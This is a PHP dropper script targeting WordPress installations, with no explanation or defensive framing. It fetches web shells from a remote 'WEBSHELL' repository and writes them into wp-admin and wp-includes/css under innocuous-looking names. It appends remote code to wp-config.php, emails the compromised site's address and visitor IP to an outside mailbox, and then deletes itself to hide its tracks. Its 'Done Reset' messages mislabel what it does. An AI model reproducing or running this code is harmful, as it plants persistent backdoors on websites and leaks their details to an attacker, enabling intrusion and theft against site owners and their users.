<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/v.php" ;
$text = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/v.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo "Done Reset ===>  ".$check."</br>";
}else 
echo "Fail Reset" ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/pm.php" ;
$text2 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/pm.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo "Done Reset ===>  ".$check2."</br>";
}else 
echo "Fail Reset" ;
$check21 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/mar.php" ;
$text21 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/mar.php');
$open21 = fopen($check21, 'w');
fwrite($open21, $text21);
fclose($open21);
if(file_exists($check21)){
    echo "Done Reset ===>  ".$check21."</br>";
}else 
echo "Fail Reset" ;
$check212 = $_SERVER['DOCUMENT_ROOT'] . "/wp-config.php" ;
$text212 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/wp-config.php');
$open212 = fopen($check212, 'a');
fwrite($open212, $text212);
fclose($open212);
if(file_exists($check212)){
    echo "Done Reset ===>  ".$check212."?up</br>";
}else {

echo "Fail Reset" ;
}
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Ghazascanner_2019runbot V2  | $ra44";
$email = "sitexploit@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$b75$a45  $m22";
mail($email, $subj98, $msg8873, $from);

@unlink(__FILE__);
?>
